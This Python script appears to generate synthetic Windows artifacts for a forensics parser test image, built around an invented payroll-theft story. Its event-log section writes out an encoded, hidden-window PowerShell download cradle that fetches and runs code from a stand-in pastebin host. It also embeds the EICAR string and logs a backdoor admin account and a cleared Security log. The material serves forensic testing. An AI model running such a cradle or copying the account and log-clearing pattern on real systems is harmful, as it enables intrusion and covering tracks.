"""Builds the synthetic user artifacts placed inside the DFIP test disk image.

Everything here is fabricated test data for exercising the parsers. The registry hives are written
separately by make_hives.py (with hivex).
"""
import io
import random
import sqlite3
import struct
import sys
import zipfile
import zlib
from datetime import datetime, timezone
from pathlib import Path

# Writers for the Windows artifact formats (shared with the backend unit tests).
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'backend' / 'tests' / 'fixtures'))
import winfmt  # noqa: E402

OUT = Path(sys.argv[1])

CHROME_EPOCH_OFFSET = 11_644_473_600  # seconds between 1601-01-01 and 1970-01-01


def chrome_ts(dt):
    return int((dt.timestamp() + CHROME_EPOCH_OFFSET) * 1_000_000)


def prtime(dt):
    return int(dt.timestamp() * 1_000_000)


def utc(*a):
    return datetime(*a, tzinfo=timezone.utc)


def write(rel, data):
    p = OUT / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        data = data.encode()
    p.write_bytes(data)
    return p


def chrome_history(path):
    path.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(path)
    db.executescript("""
        CREATE TABLE urls(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, visit_count INTEGER DEFAULT 0 NOT NULL,
                          typed_count INTEGER DEFAULT 0 NOT NULL, last_visit_time INTEGER NOT NULL, hidden INTEGER DEFAULT 0 NOT NULL);
        CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER NOT NULL, visit_time INTEGER NOT NULL, from_visit INTEGER, transition INTEGER DEFAULT 0 NOT NULL);
        CREATE TABLE downloads(id INTEGER PRIMARY KEY, guid VARCHAR NOT NULL, current_path LONGVARCHAR NOT NULL, target_path LONGVARCHAR NOT NULL,
                               start_time INTEGER NOT NULL, received_bytes INTEGER NOT NULL, total_bytes INTEGER NOT NULL, state INTEGER NOT NULL,
                               end_time INTEGER NOT NULL, opened INTEGER NOT NULL, tab_url VARCHAR NOT NULL, mime_type VARCHAR(255) NOT NULL);
    """)
    urls = [
        (1, 'https://mail.example.com/inbox', 'Inbox - Mail', 12, utc(2026, 9, 1, 8, 55)),
        (2, 'https://www.google.com/search?q=how+to+wipe+usb+drive', 'how to wipe usb drive - Google Search', 2, utc(2026, 9, 1, 10, 2)),
        (3, 'https://filetransfer.example.net/upload', 'Anonymous File Upload', 3, utc(2026, 9, 1, 10, 20)),
        (4, 'https://intranet.corp.example/hr/payroll', 'Payroll Portal', 5, utc(2026, 9, 1, 9, 40)),
    ]
    for i, url, title, count, ts in urls:
        db.execute('INSERT INTO urls VALUES (?,?,?,?,0,?,0)', (i, url, title, count, chrome_ts(ts)))
        db.execute('INSERT INTO visits(url, visit_time) VALUES (?,?)', (i, chrome_ts(ts)))
    db.execute('INSERT INTO downloads VALUES (1,?,?,?,?,?,?,1,?,1,?,?)', (
        'd1a3c1e2-0000-4000-8000-000000000001',
        r'C:\Users\alice\Downloads\SecureDelete.exe', r'C:\Users\alice\Downloads\SecureDelete.exe',
        chrome_ts(utc(2026, 9, 1, 10, 5)), 482_304, 482_304, chrome_ts(utc(2026, 9, 1, 10, 5, 9)),
        'https://tools.example.org/securedelete', 'application/octet-stream'))
    db.commit()
    db.close()


def firefox_places(path):
    path.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(path)
    db.executescript("""
        CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR,
                                visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL,
                                frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER, guid TEXT);
        CREATE TABLE moz_anno_attributes(id INTEGER PRIMARY KEY, name VARCHAR(32) UNIQUE NOT NULL);
        CREATE TABLE moz_annos(id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, content LONGVARCHAR,
                               flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0,
                               dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0);
    """)
    db.execute("INSERT INTO moz_places(id,url,title,visit_count,last_visit_date) VALUES (1,'https://pastebin.example.com/raw/x9f2','Paste',1,?)",
               (prtime(utc(2026, 9, 1, 10, 31)),))
    db.execute("INSERT INTO moz_places(id,url,title,visit_count,last_visit_date) VALUES (2,'https://cdn.example.org/tools/archiver.zip','archiver.zip',1,?)",
               (prtime(utc(2026, 9, 1, 10, 33)),))
    db.execute("INSERT INTO moz_anno_attributes VALUES (1,'downloads/destinationFileURI')")
    db.execute("INSERT INTO moz_annos(place_id,anno_attribute_id,content,dateAdded) VALUES (2,1,'file:///C:/Users/alice/Downloads/archiver.zip',?)",
               (prtime(utc(2026, 9, 1, 10, 33, 5)),))
    db.commit()
    db.close()


SETUPAPI = """[Device Install Log]
     OS Version = 6.1.7601
     Service Pack = 1.0
     Suite = 0x0100
     ProductType = 1
     Architecture = amd64

[BeginLog]

>>>  [Device Install (Hardware initiated) - USB\\VID_03F0&PID_3207\\AA951D0000007252]
>>>  Section start 2011/04/03 21:15:02.411
     ump: Creating Install Process: DrvInst.exe 21:15:02.411
<<<  Section end 2011/04/03 21:15:05.117
<<<  [Exit status: SUCCESS]


>>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_HP&Prod_v100w&Rev_1024\\AA951D0000007252&0]
>>>  Section start 2011/04/03 21:15:05.402
     ump: Creating Install Process: DrvInst.exe 21:15:05.402
<<<  Section end 2011/04/03 21:15:07.960
<<<  [Exit status: SUCCESS]


>>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_SanDisk&Prod_Cruzer_Blade&Rev_1.00\\4C530001230518109141&0]
>>>  Section start 2026/09/01 10:12:44.020
<<<  Section end 2026/09/01 10:12:46.581
<<<  [Exit status: SUCCESS]

"""


PAYROLL = 'employee,iban,salary\n' + ''.join(f'emp{i:03d},DE89370400440532013{i:03d},{50000 + i * 1000}\n' for i in range(60))

# Windows activity on 2026-09-01 (all times UTC): SecureDelete.exe runs, the payroll export is opened from
# the SanDisk drive (E:, connected 14:12:44), moved to the Recycle Bin, and SecureDelete runs again.
# FAT keeps modification times to 2 seconds, so the times stamped on files are even seconds.
RECYCLE_SID = 'S-1-5-21-3623811015-3361044348-30300820-1001'
VOLUME = r'\VOLUME{01dc1f2a3b4c5d6e-5e1f22c4}'
SECUREDELETE = VOLUME + r'\USERS\ALICE\DOWNLOADS\SECUREDELETE.EXE'
PREFETCH_NAME = f'SECUREDELETE.EXE-{winfmt.prefetch_hash(SECUREDELETE):08X}.pf'


def windows_activity():
    write(f'$Recycle.Bin/{RECYCLE_SID}/$I3K9D2A.csv',
          winfmt.recycle_bin_index(r'C:\Users\alice\Documents\payroll-export.csv', len(PAYROLL), utc(2026, 9, 1, 14, 15, 20)))
    write(f'$Recycle.Bin/{RECYCLE_SID}/$R3K9D2A.csv', PAYROLL)
    write('Users/alice/AppData/Roaming/Microsoft/Windows/Recent/payroll-export.csv.lnk', winfmt.shell_link(
        r'E:\payroll-export.csv', size=len(PAYROLL), created=utc(2026, 9, 1, 14, 13, 10), modified=utc(2026, 9, 1, 9, 41, 2),
        accessed=utc(2026, 9, 1, 14, 14, 6), drive_type=winfmt.DRIVE_REMOVABLE, drive_serial=0x6A3C91F2,
        volume_label='CRUZER', working_dir='E:\\', machine_id='laptop-07'))
    write(f'Windows/Prefetch/{PREFETCH_NAME}', winfmt.prefetch_v30(
        'SECUREDELETE.EXE', run_times=[utc(2026, 9, 1, 14, 18, 30), utc(2026, 9, 1, 10, 6, 2)], run_count=2,
        files=[VOLUME + r'\WINDOWS\SYSTEM32\NTDLL.DLL', VOLUME + r'\WINDOWS\SYSTEM32\KERNEL32.DLL', SECUREDELETE,
               VOLUME + r'\USERS\ALICE\DOCUMENTS\PAYROLL-EXPORT.CSV'],
        volume_path=VOLUME, volume_serial=0x5E1F22C4, volume_created=utc(2025, 11, 3, 8, 0, 0)))


def png(width=96, height=64) -> bytes:
    """A small grey 'whiteboard' with blue lines, for the file preview."""
    rows = b''
    for y in range(height):
        row = b'\0'
        for x in range(width):
            line = y % 12 == 6 and 8 < x < width - 8
            row += bytes((29, 78, 216)) if line else bytes((235, 238, 242))
        rows += row
    chunk = lambda kind, data: struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data))
    return (b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(rows)) + chunk(b'IEND', b''))


def pdf(text='Offer letter - Alice Example - Senior Analyst') -> bytes:
    """A one-page PDF with one line of text, for the file preview."""
    stream = f'BT /F1 18 Tf 72 720 Td ({text}) Tj ET'.encode()
    objects = [b'<< /Type /Catalog /Pages 2 0 R >>', b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
               b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
               b'<< /Length %d >>\nstream\n' % len(stream) + stream + b'\nendstream',
               b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>']
    out, offsets = b'%PDF-1.4\n', []
    for i, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b'%d 0 obj\n' % i + body + b'\nendobj\n'
    xref = len(out)
    out += b'xref\n0 %d\n0000000000 65535 f \n' % (len(objects) + 1) + b''.join(b'%010d 00000 n \n' % o for o in offsets)
    return out + b'trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n' % (len(objects) + 1, xref)


def docx(text) -> bytes:
    """A minimal Word document (Office Open XML): one paragraph of text."""
    w = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
    parts = {
        '[Content_Types].xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        '_rels/.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/></Relationships>',
        'word/document.xml': f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="{w}">'
        f'<w:body><w:p><w:r><w:t>{text}</w:t></w:r></w:p></w:body></w:document>',
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, xml in parts.items():
            z.writestr(name, xml)
    return buf.getvalue()


def encrypted_docx(text, password) -> bytes:
    """The document above, password-protected the way Word does it (an OLE container with EncryptedPackage)."""
    from msoffcrypto.format.ooxml import OOXMLFile
    out = io.BytesIO()
    OOXMLFile(io.BytesIO(docx(text))).encrypt(password, out)
    return out.getvalue()


def encrypted_zip(members, password) -> bytes:
    """A ZIP whose entries are AES-encrypted (WinZip AE-2, as 7-Zip and WinZip write them)."""
    import pyzipper
    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as z:
        z.setpassword(password)
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


# The EICAR anti-virus test file, assembled at run time so this source file is not itself detected.
EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'


def hidden_files():
    """Files whose names hide what they are, or whose content is encrypted (file processing, Phase 2)."""
    # The payroll export, copied and renamed to look like a photo.
    write('Users/alice/Pictures/holiday.jpg', PAYROLL)
    # A password-protected ZIP holding another copy (entries AES-encrypted).
    write('Users/alice/Documents/private.zip', encrypted_zip({'payroll-export.csv': PAYROLL}, b'summer2026'))
    # A password-protected Word document.
    write('Users/alice/Documents/salary-review.docx',
          encrypted_docx('Salary review 2026 - confidential - Alice Example', 'summer2026'))
    # 2 MiB of random bytes with no header: what an encrypted container (for example VeraCrypt) looks like.
    write('Users/alice/Documents/vault.dat', random.Random(2026).randbytes(2 << 20))
    # A known-bad test file with a misleading extension.
    write('Users/alice/Downloads/eicar.com', EICAR)


# Content search and found data (Phase 3). Every identifier here is a published test value; the mistyped card
# number fails its Luhn check and must not be reported.
CONTACTS = """Personal contacts - keep private
Zoë Martin <zoe.martin@example.org>, +44 20 7946 0958
Bank (personal): GB82 WEST 1234 5698 7654 32
Card on file: 4111 1111 1111 1111 (exp 09/28)
Old card, mistyped: 4111 1111 1111 1112
Aadhaar: 2345 6789 0124
BTC: 1BoatSLRHtKNngkdXEeobR76b53LETtpyT
ETH: 0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed
File server 10.20.30.40, portal https://intranet.corp.example/hr/payroll
"""
HANDOVER = 'Handover: send the payroll export to alice.personal@example.net before Friday. Salary account DE89370400440532013000.'
MEETING_RTF = (r"{\rtf1\ansi\deff0{\fonttbl{\f0 Calibri;}}{\*\generator Riched20 10.0.19041;}" "\r\n"
               r"\pard Meeting notes 1 September: the USB drive CRUZER holds the export. Caf\'e9 at 10:00.\par" "\r\n"
               r"Call +1 202 555 0143 about the transfer.\par" "\r\n}")
UTF16_NOTE = 'Reminder: wipe the SanDisk drive after copying payroll-export.csv to it.\r\n'
BUDGET_ODT_TEXT = ('Budget Q3', 'Transfer 12,400 EUR to GB82 WEST 1234 5698 7654 32 before the audit.')


def odt(heading, paragraph) -> bytes:
    """A minimal OpenDocument text file: the stored mimetype member first, then content.xml."""
    content = ('<?xml version="1.0" encoding="UTF-8"?><office:document-content '
               'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
               'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2"><office:body><office:text>'
               f'<text:h text:outline-level="1">{heading}</text:h><text:p>{paragraph}</text:p>'
               '</office:text></office:body></office:document-content>')
    manifest = ('<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" '
                'manifest:version="1.2"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>'
                '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/></manifest:manifest>')
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr(zipfile.ZipInfo('mimetype'), 'application/vnd.oasis.opendocument.text')  # stored, uncompressed
        z.writestr('content.xml', content, zipfile.ZIP_DEFLATED)
        z.writestr('META-INF/manifest.xml', manifest, zipfile.ZIP_DEFLATED)
    return buf.getvalue()


def content_files():
    write('Users/alice/Documents/contacts.txt', CONTACTS.encode('utf-8'))
    write('Users/alice/Documents/handover.docx', docx(HANDOVER))
    write('Users/alice/Documents/meeting-notes.rtf', MEETING_RTF)
    write('Users/alice/Documents/notes-utf16.txt', b'\xff\xfe' + UTF16_NOTE.encode('utf-16-le'))
    write('Users/alice/Documents/budget.odt', odt(*BUDGET_ODT_TEXT))


# Archives and embedded files (Phase 4).
README_TXT = 'Backup of the September payroll export, made before the transfer.\n'
Q3_SALARIES = 'name,email,salary\nalice,alice.personal@example.net,72000\nbob,bob.smith@example.org,68000\n'
PAYROLL_SUMMARY = ('Q3 payroll summary for finance.team@example.com: total 4,140,000 EUR, '
                   'account FR76 3000 6000 0112 3456 7890 189.\n')
Q3_DOCX_TEXT = 'Q3 payroll summary attached as an embedded file. Contact finance.team@example.com.'
TRANSFER_DETAILS = 'Transfer approved by alice: IBAN GB82 WEST 1234 5698 7654 32, reference PAY-2026-09.\n'


def seven_zip(members: dict) -> bytes:
    """A 7z archive made with the 7-Zip command line (installed by make-test-image.sh)."""
    import subprocess
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        src = Path(tmp) / 'src'
        for name, data in members.items():
            (src / name).parent.mkdir(parents=True, exist_ok=True)
            (src / name).write_bytes(data.encode() if isinstance(data, str) else data)
        out = Path(tmp) / 'archive.7z'
        subprocess.run(['7z', 'a', '-bd', '-mtm=off', str(out), '.'], cwd=src, check=True, capture_output=True)
        return out.read_bytes()


def docx_with_embeddings(text: str, media: dict, embeddings: dict) -> bytes:
    """A Word document with pictures (word/media) and embedded objects (word/embeddings)."""
    plain = zipfile.ZipFile(io.BytesIO(docx(text)))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for info in plain.infolist():
            data = plain.read(info)
            if info.filename == '[Content_Types].xml':
                data = data.replace(b'<Default Extension="xml"', b'<Default Extension="png" ContentType="image/png"/>'
                                    b'<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>'
                                    b'<Default Extension="xml"')
            z.writestr(info.filename, data)
        for name, data in media.items():
            z.writestr(f'word/media/{name}', data)
        for name, data in embeddings.items():
            z.writestr(f'word/embeddings/{name}', data)
    return buf.getvalue()


def pdf_with_attachment(name: str, data: bytes) -> bytes:
    from pypdf import PdfReader, PdfWriter
    writer = PdfWriter(clone_from=PdfReader(io.BytesIO(pdf('Bank statement - September 2026 - see the attached transfer details'))))
    writer.add_attachment(name, data)
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def container_files():
    write('Users/alice/Documents/export-backup.zip', _plain_zip({
        'payroll-export.csv': PAYROLL, 'notes/readme.txt': README_TXT,
        'archive.7z': seven_zip({'q3-salaries.csv': Q3_SALARIES})}))
    ole = winfmt.compound_file({'\x01Ole10Native': winfmt.ole10native('payroll-summary.txt', PAYROLL_SUMMARY.encode())})
    write('Users/alice/Documents/q3-payroll.docx', docx_with_embeddings(Q3_DOCX_TEXT, {'image1.png': png()}, {'oleObject1.bin': ole}))
    write('Users/alice/Documents/statement.pdf', pdf_with_attachment('transfer-details.txt', TRANSFER_DETAILS.encode()))


def _plain_zip(members: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


# Windows event logs (Phase 6), written by backend/tests/fixtures/evtx.py. The story they add: alice logs on at 08:52,
# a "Secure Delete Helper" service is installed from her AppData at 10:07, she logs off for lunch and back on at 13:28,
# plugs in the SanDisk drive at 14:12:44, runs an encoded PowerShell download cradle at 14:24:30, clears the Security
# log at 14:25 (so the earlier Security events are gone), unlocks at 14:30, removes the drive at 14:41:10; someone at
# 192.168.1.66 tries the administrator password three times (too few to count as brute force); a backup_admin account
# is created and added to Administrators at 15:10 and deleted at 18:30; alice logs off and shuts down at 18:42.
ALICE_SID = 'S-1-5-21-3623811015-3361044348-30300820-1001'
BACKDOOR_SID = 'S-1-5-21-3623811015-3361044348-30300820-1002'
PS_SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("https://pastebin.example.com/raw/x9f2")'
PS_COMMAND = 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ' + __import__('base64').b64encode(PS_SCRIPT.encode('utf-16-le')).decode()
SANDISK_SERIAL = '4C530001230518109141'
LOGS = 'Windows/System32/winevt/Logs'
AUDIT_SUCCESS, AUDIT_FAILURE, CLASSIC = 0x8020000000000000, 0x8010000000000000, 0x80000000000000


def event_logs():
    import evtx as ev
    t = lambda h, m, s=0: utc(2026, 9, 1, h, m, s)
    sec = ('Security', 'Microsoft-Windows-Security-Auditing', '{54849625-5478-4994-A5BA-3E3B0328C30D}')

    def s(eid, when, data, task, keywords=AUDIT_SUCCESS, **kw):  # Security audit events are logged at level 0 (Log Always)
        return ev.Event(*sec, eid, when, data, level=0, task=task, keywords=keywords, process_id=684, thread_id=1220, **kw)

    who = {'SubjectUserSid': ALICE_SID, 'SubjectUserName': 'alice', 'SubjectDomainName': 'LAPTOP-07', 'SubjectLogonId': '0x3e7a12'}
    security = [
        # A cleared log starts again at record 1 with the clearing event, which names who cleared it.
        ev.Event('Security', 'Microsoft-Windows-Eventlog', '{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}', 1102, t(14, 25), {},
                 task=104, keywords=0x4020000000000000, process_id=1344, thread_id=5932,
                 user_data=('LogFileCleared', 'http://manifests.microsoft.com/win/2004/08/windows/eventlog', who)),
        s(4624, t(14, 30, 12), {'SubjectUserSid': 'S-1-5-18', 'SubjectUserName': 'LAPTOP-07$', 'SubjectDomainName': 'WORKGROUP',
                                 'SubjectLogonId': '0x3e7', 'TargetUserSid': ALICE_SID, 'TargetUserName': 'alice', 'TargetDomainName': 'LAPTOP-07',
                                 'TargetLogonId': '0x3e7a12', 'LogonType': '7', 'LogonProcessName': 'User32', 'AuthenticationPackageName': 'Negotiate',
                                 'WorkstationName': 'LAPTOP-07', 'ProcessName': 'C:\\Windows\\System32\\svchost.exe', 'IpAddress': '127.0.0.1',
                                 'IpPort': '0'}, 12544),
    ] + [
        s(4625, t(15, 2, second), {'SubjectUserSid': 'S-1-0-0', 'TargetUserName': 'administrator', 'TargetDomainName': 'LAPTOP-07',
                                    'Status': '0xc000006d', 'FailureReason': '%%2313', 'SubStatus': '0xc000006a', 'LogonType': '3',
                                    'LogonProcessName': 'NtLmSsp', 'AuthenticationPackageName': 'NTLM', 'WorkstationName': 'KALI',
                                    'IpAddress': '192.168.1.66', 'IpPort': '49812'}, 12544, AUDIT_FAILURE)
        for second in (10, 25, 41)
    ] + [
        s(4720, t(15, 10, 5), dict(who, TargetUserName='backup_admin', TargetDomainName='LAPTOP-07', TargetSid=BACKDOOR_SID,
                                   SamAccountName='backup_admin', UserAccountControl='%%2080 %%2082 %%2084'), 13824),
        s(4732, t(15, 10, 20), dict(who, MemberName='-', MemberSid=BACKDOOR_SID, TargetUserName='Administrators', TargetDomainName='Builtin',
                                    TargetSid='S-1-5-32-544'), 13826),
        s(4726, t(18, 30), dict(who, TargetUserName='backup_admin', TargetDomainName='LAPTOP-07', TargetSid=BACKDOOR_SID), 13824),
        s(4647, t(18, 41, 30), {'TargetUserSid': ALICE_SID, 'TargetUserName': 'alice', 'TargetDomainName': 'LAPTOP-07', 'TargetLogonId': '0x3e7a12'},
          12545),
    ]
    winlogon = ('System', 'Microsoft-Windows-Winlogon', '{DBE9B383-7CF3-4331-91CC-A3CB16A3B538}')
    session = {'TSId': '1', 'UserSid': ALICE_SID}
    system = [
        ev.Event('System', 'EventLog', '', 6005, t(8, 50, 2), [], keywords=CLASSIC),
        ev.Event(*winlogon, 7001, t(8, 52, 10), session, task=1101, user_sid='S-1-5-18'),
        ev.Event('System', 'Service Control Manager', '{555908d1-a6d7-4695-8e1e-26931d2012f4}', 7045, t(10, 7, 30),
                 {'ServiceName': 'Secure Delete Helper', 'ImagePath': 'C:\\Users\\alice\\AppData\\Roaming\\sdsvc.exe',
                  'ServiceType': 'user mode service', 'StartType': 'auto start', 'AccountName': 'LocalSystem'},
                 keywords=CLASSIC, user_sid=ALICE_SID, process_id=712, thread_id=3344),
        ev.Event(*winlogon, 7002, t(12, 31, 4), session, task=1102, user_sid='S-1-5-18'),
        ev.Event(*winlogon, 7001, t(13, 28, 41), session, task=1101, user_sid='S-1-5-18'),
        ev.Event('System', 'User32', '{b0aa8734-56f7-41cc-b2f4-de228e98b946}', 1074, t(18, 42),
                 {'param1': 'C:\\Windows\\Explorer.EXE (LAPTOP-07)', 'param2': 'LAPTOP-07', 'param3': 'Other (Unplanned)', 'param4': '0x0',
                  'param5': 'power off', 'param6': '', 'param7': 'LAPTOP-07\\alice'}, keywords=CLASSIC, user_sid=ALICE_SID),
        ev.Event('System', 'EventLog', '', 6006, t(18, 42, 5), [], keywords=CLASSIC),
    ]
    ps_op = [ev.Event('Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}',
                      4104, t(14, 24, 31), {'MessageNumber': '1', 'MessageTotal': '1', 'ScriptBlockText': PS_SCRIPT,
                                            'ScriptBlockId': '{5b1c7e9a-2d4f-4b8e-9c3a-1f0e2d3c4b5a}', 'Path': ''},
                      level=3, task=2, opcode=15, keywords=0x0, user_sid=ALICE_SID, process_id=7716, thread_id=6120)]

    def details(new, previous):  # the third value of a classic PowerShell engine event: key=value lines
        return (f'NewEngineState={new}\r\n\tPreviousEngineState={previous}\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n'
                '\tHostVersion=5.1.19041.4780\r\n\tHostId=3c9b8d0e-6a7f-4e21-9b1c-2d3e4f5a6b7c\r\n'
                f'\tHostApplication={PS_COMMAND}\r\n\tEngineVersion=5.1.19041.4780\r\n\tRunspaceId=8f0d6f3e-1b2c-4d5e-9f6a-7b8c9d0e1f2a\r\n')
    ps_classic = [ev.Event('Windows PowerShell', 'PowerShell', '', 400, t(14, 24, 30), ['Available', 'None', details('Available', 'None')],
                           task=4, keywords=CLASSIC, process_id=7716, thread_id=0),
                  ev.Event('Windows PowerShell', 'PowerShell', '', 403, t(14, 24, 33), ['Stopped', 'Available', details('Stopped', 'Available')],
                           task=4, keywords=CLASSIC, process_id=7716, thread_id=0)]
    disk = {'Version': '2', 'DiskNumber': '1', 'Flags': '0x0', 'Characteristics': '0x100000', 'IsSystem': 'false', 'IsBoot': 'false',
            'BusType': '7', 'Manufacturer': 'SanDisk', 'Model': 'Cruzer Blade', 'Revision': '1.00', 'SerialNumber': SANDISK_SERIAL,
            'Location': 'Integrated : Adapter 0 : Port 0 : Target 0 : LUN 0', 'ParentId': f'USB\\VID_0781&PID_5567\\{SANDISK_SERIAL}',
            'BytesPerSector': '512'}
    part = ('Microsoft-Windows-Partition/Diagnostic', 'Microsoft-Windows-Partition', '{412bdff2-a8c4-470d-8f33-63fe0d8c20e2}')
    partition = [ev.Event(*part, 1006, t(14, 12, 44), dict(disk, Capacity='15931539456', PartitionCount='1'), task=1006, keywords=0x0,
                          user_sid='S-1-5-18'),
                 ev.Event(*part, 1006, t(14, 41, 10), dict(disk, Capacity='0', PartitionCount='0'), task=1006, keywords=0x0, user_sid='S-1-5-18')]
    write(f'{LOGS}/Security.evtx', ev.write_evtx(security, first_record_id=1))
    write(f'{LOGS}/System.evtx', ev.write_evtx(system, first_record_id=4512))
    write(f'{LOGS}/Microsoft-Windows-PowerShell%4Operational.evtx', ev.write_evtx(ps_op, first_record_id=812))
    write(f'{LOGS}/Windows PowerShell.evtx', ev.write_evtx(ps_classic, first_record_id=233))
    write(f'{LOGS}/Microsoft-Windows-Partition%4Diagnostic.evtx', ev.write_evtx(partition, first_record_id=57))


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    write('Windows/INF/setupapi.dev.log', SETUPAPI.replace('\n', '\r\n'))
    chrome_history(OUT / 'Users/alice/AppData/Local/Google/Chrome/User Data/Default/History')
    firefox_places(OUT / 'Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/k2x8.default-release/places.sqlite')
    write('Users/alice/Documents/project-notes.txt', 'Q3 project notes. Nothing sensitive here.\n' * 40)
    # Stamped in standard time (EST) by make-test-image.sh, to prove daylight saving is handled per date.
    write('Users/alice/Documents/q1-forecast.txt', 'Q1 2026 forecast draft. Figures to be confirmed.\n')
    write('Users/alice/Documents/year-end-checklist.txt', 'Year-end checklist: archive mail, renew licences.\n')
    # Deleted by make-test-image.sh after being copied into the image.
    write('Users/alice/Documents/payroll-export.csv', PAYROLL)
    write('Users/alice/Downloads/cleanup.ps1',
          'powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\n')
    windows_activity()
    write('Users/alice/Pictures/whiteboard.png', png())
    write('Users/alice/Documents/offer-letter.pdf', pdf())
    hidden_files()
    content_files()
    container_files()
    event_logs()
    print(PREFETCH_NAME)


if __name__ == '__main__':
    main()
